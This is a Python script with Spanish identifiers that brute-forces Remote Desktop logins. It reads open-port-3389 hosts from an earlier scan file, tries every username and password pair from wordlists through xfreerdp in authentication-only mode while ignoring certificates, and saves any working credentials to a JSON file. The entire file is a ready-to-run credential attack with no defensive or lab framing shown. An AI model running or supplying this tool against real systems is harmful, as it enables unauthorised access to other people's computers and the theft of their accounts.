import subprocess
import os
import json

RDP_RESULTS_DIR = "results/rdp"
WORDLIST_USER = "wordlists/users.txt"
WORDLIST_PASS = "wordlists/passwords.txt"

def fuerza_bruta_rdp(ip, port=3389):
    os.makedirs(RDP_RESULTS_DIR, exist_ok=True)
    resultados = {
        "host": ip,
        "port": port,
        "valid_credentials": []
    }

    with open(WORDLIST_USER, "r") as f:
        usuarios = [line.strip() for line in f if line.strip()]

    with open(WORDLIST_PASS, "r") as f:
        contrasenas = [line.strip() for line in f if line.strip()]

    print(f"[*] Iniciando fuerza bruta RDP contra {ip}:{port}...")

    for usuario in usuarios:
        for contrasena in contrasenas:
            comando = [
                "xfreerdp", f"/u:{usuario}", f"/p:{contrasena}", f"/v:{ip}:{port}", "+auth-only",
                "/cert:ignore"
            ]
            resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            salida = resultado.stdout.decode() + resultado.stderr.decode()

            if "Authentication only, exit status 0" in salida:
                print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})

    ruta_salida = os.path.join(RDP_RESULTS_DIR, f"rdp_{ip}_bruteforce.json")
    with open(ruta_salida, "w") as f:
        json.dump(resultados, f, indent=4)

    print(f"[+] Resultados guardados en {ruta_salida}")
    return resultados

def run_rdp_attack():

    with open("results/scan_results.json") as f:
        data = json.load(f)

    hosts = data.get("hosts", [])

    for host in hosts:
        ip = host.get("ip")
        for port_info in host.get("open_ports", []):
            if port_info.get("port") == 3389:
                fuerza_bruta_rdp(ip)
                break